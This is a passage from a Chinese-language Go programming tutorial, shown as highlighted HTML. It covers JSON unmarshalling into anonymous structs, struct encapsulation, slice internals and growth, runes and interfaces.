class="hljs-comment">//返回json数据</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getJsonData</span><span class="hljs-params">()</span> []<span class="hljs-title">byte</span></span> &#123;<br><span class="hljs-comment">//tempData 接收匿名结构体（匿名结构体使得数据的结构更加灵活）</span><br>tempData := <span class="hljs-keyword">struct</span> &#123;<br>Screen01<br>Battery<br>HashTouchId <span class="hljs-keyword">bool</span>  <span class="hljs-comment">// 是否有指纹识别</span><br>&#125;&#123;<br>Screen01:    Screen01&#123;Size: <span class="hljs-number">12</span>, ResX: <span class="hljs-number">36</span>, ResY: <span class="hljs-number">36</span>&#125;,<br>Battery:     Battery&#123;<span class="hljs-string">&quot;6000毫安&quot;</span>&#125;,<br>HashTouchId: <span class="hljs-literal">true</span>,<br>&#125;<br>jsonData, _ := json.Marshal(tempData)  <span class="hljs-comment">//将数据转换为json</span><br><span class="hljs-keyword">return</span> jsonData<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>jsonData := getJsonData() <span class="hljs-comment">//获取json数据</span><br>fmt.Println(jsonData)<br>fmt.Println(<span class="hljs-string">&quot;=========解析（分离）出的数据是===========&quot;</span>)<br><span class="hljs-comment">//自定义匿名结构体，解析（分离）全部数据</span><br>allData := <span class="hljs-keyword">struct</span> &#123;<br>Screen01<br>Battery<br>HashTouchId <span class="hljs-keyword">bool</span><br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;allData)<br>fmt.Println(<span class="hljs-string">&quot;解析（分离）全部结构为：&quot;</span>, allData)<br><span class="hljs-comment">//自定义匿名结构体，通过json数据，解析（分离）对应的结构（可以是部分结构）</span><br>screenBattery := <span class="hljs-keyword">struct</span> &#123;<br>Screen01<br>Battery<br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;screenBattery) <span class="hljs-comment">//注意：此处只能为结构体指针（一般参数为interface&#123;&#125;，都采用地址引用（即地址传递））</span><br>fmt.Println(<span class="hljs-string">&quot;解析（分离）部分结构:&quot;</span>, screenBattery)<br><span class="hljs-comment">//自定义匿名结构体，解析（分离）部分结构</span><br>batteryTouch := <span class="hljs-keyword">struct</span> &#123;<br>Battery<br>isTouch <span class="hljs-keyword">bool</span><br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;batteryTouch)<br>fmt.Println(<span class="hljs-string">&quot;解析（分离）部分结构:&quot;</span>, batteryTouch)<br><span class="hljs-comment">//自定义匿名结构体，解析（分离）部分不存在的结构</span><br>temp1 := <span class="hljs-keyword">struct</span> &#123;<br>Battery<br>Detail <span class="hljs-keyword">struct</span> &#123;<br>Name  <span class="hljs-keyword">string</span><br>Price <span class="hljs-keyword">uint16</span><br>&#125;<br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;temp1)<br>fmt.Println(<span class="hljs-string">&quot;解析（分离）部分不存在的结构&quot;</span>, temp1)<br><span class="hljs-comment">//自定义匿名结构体，解析（分离）完全不存在的结构</span><br>temp2 := <span class="hljs-keyword">struct</span> &#123;<br>User  <span class="hljs-keyword">string</span><br>Price <span class="hljs-keyword">uint16</span><br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;temp2)<br>fmt.Println(<span class="hljs-string">&quot;解析（分离）完全不存在的结构:&quot;</span>, temp2)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>在Go语言中，我们可以对结构体的字段进行封装，并通过结构体中的方法来操作内部的字段。如果结构体中字段名的首字母是小写字母，那么这样的字段是私有的，相当于private字段。外部包裹能直接访问，如果是在名的首字母是大写字母，那么这样的字段对外暴露的，相当于public字段。能够起的方法也是一样的，如果方法名首字母是大写字母，那么这样的方法对外暴露的。</p><p>封装的好处：</p><ul><li>隐藏实现细节；</li><li>可以对数据进行验证，保证数据安全合理。</li></ul><p>如何体现封装：</p><ul><li>对结构体中的属性进行封装；</li><li>通过方法，包，实现封装。</li></ul><p>封装的实现步骤：</p><ol><li>将结构体、字段的首字母小写；</li><li>给结构体所在的包提供一个工厂模式的函数，首字母大写，类似一个构造函数；</li><li>提供一个首字母大写的Set方法（类似其它语言的public），用于对属性判断并赋值；</li><li>提供一个首字母大写的Get方法（类似其它语言的public），用于获取属性的值。</li></ol><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> model<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> person <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-keyword">string</span><br>age <span class="hljs-keyword">int</span>   <span class="hljs-comment">//其它包不能直接访问..</span><br>sal <span class="hljs-keyword">float64</span><br>&#125;<br><br><span class="hljs-comment">//写一个工厂模式的函数，相当于构造函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-keyword">string</span>)</span> *<span class="hljs-title">person</span></span> &#123;<br><span class="hljs-keyword">return</span> &amp;person&#123;<br>Name : name,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//为了访问age 和 sal 我们编写一对SetXxx的方法和GetXxx的方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">SetAge</span><span class="hljs-params">(age <span class="hljs-keyword">int</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> age &gt;<span class="hljs-number">0</span> &amp;&amp; age &lt;<span class="hljs-number">150</span> &#123;<br>p.age = age<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;年龄范围不正确..&quot;</span>)<br><span class="hljs-comment">//给程序员给一个默认值</span><br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">GetAge</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123;<br><span class="hljs-keyword">return</span> p.age<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">SetSal</span><span class="hljs-params">(sal <span class="hljs-keyword">float64</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> sal &gt;= <span class="hljs-number">3000</span> &amp;&amp; sal &lt;= <span class="hljs-number">30000</span> &#123;<br>p.sal = sal<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;薪水范围不正确..&quot;</span>)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">GetSal</span><span class="hljs-params">()</span> <span class="hljs-title">float64</span></span> &#123;<br><span class="hljs-keyword">return</span> p.sal<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;mytest/encapsulation/model&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>p := model.NewPerson(<span class="hljs-string">&quot;smith&quot;</span>)<br>p.SetAge(<span class="hljs-number">18</span>)<br>p.SetSal(<span class="hljs-number">5000</span>)<br>fmt.Println(p)<br>fmt.Println(p.Name, <span class="hljs-string">&quot; age =&quot;</span>, p.GetAge(), <span class="hljs-string">&quot; sal = &quot;</span>, p.GetSal())<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><h3 id="slice的结构体"><a href="#slice的结构体" class="headerlink" title="slice的结构体"></a>slice的结构体</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> slice <span class="hljs-keyword">struct</span> &#123;<br>    array unsafe.Pointer <span class="hljs-comment">// 指针,指向底层数组</span><br>    <span class="hljs-built_in">len</span>   <span class="hljs-keyword">int</span> <span class="hljs-comment">// slice长度，即当前slice可以访问的范围</span><br>    <span class="hljs-built_in">cap</span>   <span class="hljs-keyword">int</span> <span class="hljs-comment">// slice容量，当前slice可访问底层数组的最大范围，如果cap不够，则会执行扩容操作</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="切片和数组的关系"><a href="#切片和数组的关系" class="headerlink" title="切片和数组的关系"></a>切片和数组的关系</h3><ol><li>切片的本质是操作数组，只是数组是固定长度的，而切片的长度可变的</li><li>切片是引用类型，可以理解为引用数组的一个片段；而数组是值类型，把数组A赋值给数组B，会为数组B开辟新的内存空间，修改数组B的值并不会影响数组A。而切片作为引用类型，指向同一个内存地址，是会互相影响的。</li></ol><p>切片的长度：元素的个数</p><p>切片的容量：在切片引用的底层数组中从切片的第一个元素到数组最后一个元素的长度（元素数量）</p><p>所以判断一个切片是否为空，使用len(s) == 0 判断，不能使用 s==nil 判断</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">a1 := [...]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br><br>s5 := a1[:<span class="hljs-number">4</span>] <span class="hljs-comment">//[1 2 3 4]</span><br>s6 := a1[<span class="hljs-number">2</span>:] <span class="hljs-comment">//[3 4 5 6 7 8 9]</span><br>s7 := a1[:]  <span class="hljs-comment">//[1 2 3 4 5 6 7 8 9]</span><br><br>fmt.Printf(<span class="hljs-string">&quot;len(s5):%d cap(s5):%d\\n&quot;</span>, <span class="hljs-built_in">len</span>(s5), <span class="hljs-built_in">cap</span>(s5)) <span class="hljs-comment">//4 9</span><br>fmt.Printf(<span class="hljs-string">&quot;len(s6):%d cap(s6):%d\\n&quot;</span>, <span class="hljs-built_in">len</span>(s6), <span class="hljs-built_in">cap</span>(s6)) <span class="hljs-comment">//7 7</span><br>fmt.Printf(<span class="hljs-string">&quot;len(s7):%d cap(s7):%d\\n&quot;</span>, <span class="hljs-built_in">len</span>(s7), <span class="hljs-built_in">cap</span>(s7)) <span class="hljs-comment">//9 9</span><br></code></pre></td></tr></table></figure><p>注意：<strong>slice是引用类型</strong></p><p>当底层数组改变时，不管是切片，还是切片再切片，值都会改变。因为他们使用的是一个内存块，引用的一个内存地址。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//定义数组</span><br>a1 := [...]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-comment">//有数组切割成切片s6</span><br>s6 := a1[<span class="hljs-number">2</span>:] <span class="hljs-comment">//[3 4 5 6 7 8 9]</span><br><span class="hljs-comment">//切片再次切片，赋值给s8</span><br>s8 :=s6[<span class="hljs-number">3</span>:] <span class="hljs-comment">//[6 7 8 9]</span><br><span class="hljs-comment">//修改原始数组，把下标为2的值由3改为333</span><br>a1[<span class="hljs-number">2</span>] = <span class="hljs-number">333</span><br><span class="hljs-comment">//打印s6，发现s6中的3也变成了333</span><br>fmt.Println(<span class="hljs-string">&quot;s6:&quot;</span>, s6) <span class="hljs-comment">//[333 4 5 6 7 8 9]</span><br><span class="hljs-comment">//因为s8基于s6切片而成，我们测试一下切片再切片的引用传的</span><br>fmt.Println(<span class="hljs-string">&quot;s8:&quot;</span>, s8) <span class="hljs-comment">//[6 7 8 9]</span><br><span class="hljs-comment">//我们把原始数组下标为5的值由6改为666</span><br>a1[<span class="hljs-number">5</span>] = <span class="hljs-number">666</span><br><span class="hljs-comment">//打印s8切片，得到结果6也变成了666</span><br>fmt.Println(<span class="hljs-string">&quot;s8:&quot;</span>, s8) <span class="hljs-comment">//[666 7 8 9]</span><br></code></pre></td></tr></table></figure><h3 id="生成切片"><a href="#生成切片" class="headerlink" title="生成切片"></a>生成切片</h3><p>初始化一个 slice 有两种方式:</p><ul><li>直接声明: 比如 <code>var s []int</code></li><li>使用 make 关键字，比如: <code>s := make([]int, 0)</code></li></ul><p>区别：</p><ul><li>直接声明 slice 的方式内部是不申请内存空间的，slice 内部 array 指针指向 null。</li><li>使用 make 关键字<strong>会申请包含 0 个元素的内存空间</strong>，底层 array 指针指向申请的内存。</li></ul><p>使用json.Marshal序列化的结果是有区别的。</p><ul><li>json.Marshal(直接声明): 返回 null</li><li>json.Marshal(make关键字初始化): 返回 []</li></ul><p><strong>make()函数的第一个参数指定切片的数组类型，第二个参数指定切片的长度，第三个参数指定切片的容量。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)<br>fmt.Printf(<span class="hljs-string">&quot;s1：%v len(s1)：%d cap(s1)：%d\\n&quot;</span>, s1, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))<br></code></pre></td></tr></table></figure><h3 id="扩容机制"><a href="#扩容机制" class="headerlink" title="扩容机制"></a>扩容机制</h3><p>只有 append 操作可以触发 slice 的扩容</p><p>slice 在初始化时只会申请有限的内存空间，而随着 append 元素的增多，当元素超过当前 slice 的 cap ，就会重新申请一段新内存，把原数据 copy 到这个新内存上，然后 slice 把内部的指针指向这段新内存。</p><ol><li>如果新申请容量（cap）大于2倍的旧容量（old.cap），最终容量（newcap）就是新申请的容量（cap）</li><li>如果旧切片的长度小于1024，则最终容量(newcap)就是旧容量(old.cap)的两倍，即（newcap=doublecap）</li><li>如果旧切片长度大于等于1024，则最终容量（newcap）从旧容量（old.cap）开始循环增加原来的 1/4，即（newcap=old.cap,for {newcap += newcap/4}）直到最终容量（newcap）大于等于新申请的容量(cap)，即（newcap &gt;= cap）</li><li>如果最终容量（cap）计算值溢出，则最终容量（cap）就是新申请容量（cap）</li></ol><p>源码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go">newcap := old.<span class="hljs-built_in">cap</span><br>    doublecap := newcap + newcap <span class="hljs-comment">// 两倍扩容</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">cap</span> &gt; doublecap &#123; <span class="hljs-comment">// 待扩容大小大于原切片的两倍，则按照待扩容大小处理</span><br>        newcap = <span class="hljs-built_in">cap</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> old.<span class="hljs-built_in">len</span> &lt; <span class="hljs-number">1024</span> &#123; <span class="hljs-comment">// 当原切片长度小于1024时，新切片的容量会直接翻倍。</span><br>            newcap = doublecap<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 当原切片的容量大于等于1024时，会反复地增加25%，直到新容量超过所需要的容量。</span><br>            <span class="hljs-comment">// Check 0 &lt; newcap to detect overflow</span><br>            <span class="hljs-comment">// and prevent an infinite loop.</span><br>            <span class="hljs-keyword">for</span> <span class="hljs-number">0</span> &lt; newcap &amp;&amp; newcap &lt; <span class="hljs-built_in">cap</span> &#123;<br>                newcap += newcap / <span class="hljs-number">4</span><br>            &#125;<br>            <span class="hljs-comment">// Set newcap to the requested cap when</span><br>            <span class="hljs-comment">// the newcap calculation overflowed.</span><br>            <span class="hljs-keyword">if</span> newcap &lt;= <span class="hljs-number">0</span> &#123;<br>                newcap = <span class="hljs-built_in">cap</span><br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>demo</p><p>如果在函数内部发生了扩容，这时再修改 slice 中的值是不起作用的，因为修改发生在新的 array 内存中，对老的 array 内存不起作用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>, <span class="hljs-number">3</span>,<span class="hljs-number">8</span>)<br>s[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>s[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>s[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span><br>fmt.Println(<span class="hljs-string">&quot;s =&quot;</span>,s, <span class="hljs-built_in">cap</span>(s)) <span class="hljs-comment">//s = [0 1 2] 8</span><br>s1 := s;<br><span class="hljs-comment">// 指向同一数组（s还有容量可以扩容，所以其实s和s1其实是都指向同一数组的，可以理解为浅拷贝）</span><br>s1 = <span class="hljs-built_in">append</span>(s,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)<br>s1[<span class="hljs-number">1</span>] = <span class="hljs-number">123</span><br>fmt.Println(<span class="hljs-string">&quot;s =&quot;</span>,s, <span class="hljs-built_in">cap</span>(s)) <span class="hljs-comment">//s = [0 123 2] 8</span><br>fmt.Println(<span class="hljs-string">&quot;s1=&quot;</span>,s1, <span class="hljs-built_in">cap</span>(s1)) <span class="hljs-comment">//s1= [0 123 2 3 4] 8</span><br><br><span class="hljs-comment">// s没有容量扩容了，新slice和s指向不同数组（可以理解为执行了slice的深拷贝）</span><br>s2 := <span class="hljs-built_in">append</span>(s1,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)<br>fmt.Println(<span class="hljs-string">&quot;s2=&quot;</span>,s2, <span class="hljs-built_in">cap</span>(s2)) <span class="hljs-comment">//s2= [0 123 2 3 4 1 2 3 4 5] 16</span><br>s2[<span class="hljs-number">2</span>] = <span class="hljs-number">123</span><br>fmt.Println(<span class="hljs-string">&quot;s =&quot;</span>,s, <span class="hljs-built_in">cap</span>(s)) <span class="hljs-comment">//s = [0 123 2] 8</span><br>fmt.Println(<span class="hljs-string">&quot;s2=&quot;</span>,s2, <span class="hljs-built_in">cap</span>(s2)) <span class="hljs-comment">//s2= [0 123 123 3 4 1 2 3 4 5] 16</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><p>copy方法是复制了一份，开辟了新的内存空间，不再引用s1的内存地址</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//定义切片s1</span><br>s1 := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><br><span class="hljs-comment">//第一种方式：直接声明变量 用=赋值</span><br><span class="hljs-comment">//s2切片和s1引用同一个内存地址</span><br><span class="hljs-keyword">var</span> s2 = s1<br><br><span class="hljs-comment">//第二种方式：copy</span><br><span class="hljs-keyword">var</span> s3 = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">copy</span>(s3, s1)            <span class="hljs-comment">//使用copy函数将 参数2的元素复制到参数1</span><br><br>s1[<span class="hljs-number">0</span>] = <span class="hljs-number">11</span><br>fmt.Printf(<span class="hljs-string">&quot;s1:%v s2:%v s3:%v&quot;</span>,s1, s2, s3) <span class="hljs-comment">//s1和s2是[11 2 3] s3是[1 2 3]</span><br></code></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除切片中的元素 不能直接删除 可以组合使用分割+append的方式删除切片中的元素</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">s3 := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>s3 = <span class="hljs-built_in">append</span>(s3[:<span class="hljs-number">1</span>], s3[<span class="hljs-number">2</span>:]...) <span class="hljs-comment">//第一个不用拆开 原因是一个作为被接受的一方  是把后面的元素追加到第一个</span><br>fmt.Println(s3)<br></code></pre></td></tr></table></figure><h2 id="rune"><a href="#rune" class="headerlink" title="rune"></a>rune</h2><p>rune它是int32的别名（-2147483648~2147483647），相比于byte（-128～127），可表示的字符更多。由于rune可表示的范围更大，所以能处理一切字符，当然也包括中文字符。在平时计算中文字符，可用rune。</p><p>字符串修改是不能直接修改的，需要转成rune切片后再修改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := <span class="hljs-string">&quot;小白兔&quot;</span><br>s3 := []<span class="hljs-keyword">rune</span>(s2)        <span class="hljs-comment">//把字符串强制转成rune切片</span><br>s3[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;大&#x27;</span>             <span class="hljs-comment">//注意 这里需要使用单引号的字符，而不是双引号的字符串</span><br>fmt.Println(<span class="hljs-keyword">string</span>(s3)) <span class="hljs-comment">//把rune类型的s3强转成字符串</span><br></code></pre></td></tr></table></figure><p><strong>只要是双引号包裹的类型就是string，只要是单引号包裹的类型就是int32，也就是rune。和中英文无关。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">c1 := <span class="hljs-string">&quot;红&quot;</span><br>c2 := <span class="hljs-string">&#x27;红&#x27;</span>                            <br>fmt.Printf(<span class="hljs-string">&quot;c1的类型:%T c2的类型:%T \\n&quot;</span>, c1, c2)  <span class="hljs-comment">//c1的类型:string c2的类型:int32</span><br>c3 := <span class="hljs-string">&quot;H&quot;</span>                            <br>c4 := <span class="hljs-string">&#x27;H&#x27;</span>                            <br>fmt.Printf(<span class="hljs-string">&quot;c3的类型:%T c4的类型:%T \\n&quot;</span>, c3, c4)  <span class="hljs-comment">//c3的类型:string c4的类型:int32</span><br></code></pre></td></tr></table></figure><h2 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h2><p>Interface 是一个定义了方法签名的集合,用来指定对象的行为，如果对象做到了 Interface 中方法集定义的行为，那就可以说实现了 Interface；</p><p>这些方法可以在不同的地方被不同的对象实现，这些实现可以具有不同的行为；</p><p>interface 的主要工作仅是提供方法名称签名,输入参数,返回类型。最终由具体的对象来实现方法，比如 struct；</p><p>interface 初始化值为 nil；</p><p><code>golang</code>接口定义不能包含变量，但是允许不带任何方法，这种类型的接口叫 <code>empty interface</code>。</p><p>使用 type 关键字来申明，interface 代表类型，大括号里面定义接口的方法签名集合。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Animal <span class="hljs-keyword">interface</span> &#123;<br>Bark() <span class="hljs-keyword">string</span><br>Walk() <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如下，Dog 实现了 Animal 接口，所以可以用 Animal 的实例去接收 Dog的实例，必须是同时实现 Bark() 和Walk() 方法，否则都不能算实现了Animal接口。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Dog <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-keyword">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(dog Dog)</span> <span class="hljs-title">Bark</span><span class="hljs-params">()</span> <span class="hljs-title">string</span></span> &#123;<br>fmt.Println(dog.name + <span class="hljs-string">&quot;:wan wan wan!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wan wan wan&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(dog Dog)</span> <span class="hljs-title">Walk</span><span class="hljs-params">()</span> <span class="hljs-title">string</span></span> &#123;<br>fmt.Println(dog.name + <span class="hljs-string">&quot;:walk to park!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;walk to park&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> animal Animal<br><br>fmt.Println(<span class="hljs-string">&quot;animal value is:&quot;</span>, animal)<span class="hljs-comment">//animal value is: &lt;nil&gt;</span><br>fmt.Printf(<span class="hljs-string">&quot;animal type is: %T\\n&quot;</span>, animal) <span class="hljs-comment">//animal type is: &lt;nil&gt;</span><br><br>animal = Dog&#123;<span class="hljs-string">&quot;旺财&quot;</span>&#125;<br>animal.Bark() <span class="hljs-comment">//旺财:wan wan wan!</span><br>animal.Walk() <span class="hljs-comment">//旺财:walk to park!</span><br><br>fmt.Println(<span class="hljs-string">&quot;animal value is:&quot;</span>, animal) <span class="hljs-comment">//animal value is: &#123;旺财&#125;</span><br>fmt.Printf(<span class="hljs-string">&quot;animal type is: %T\\n&quot;</span>, animal) <span class="hljs-comment">//animal type is: 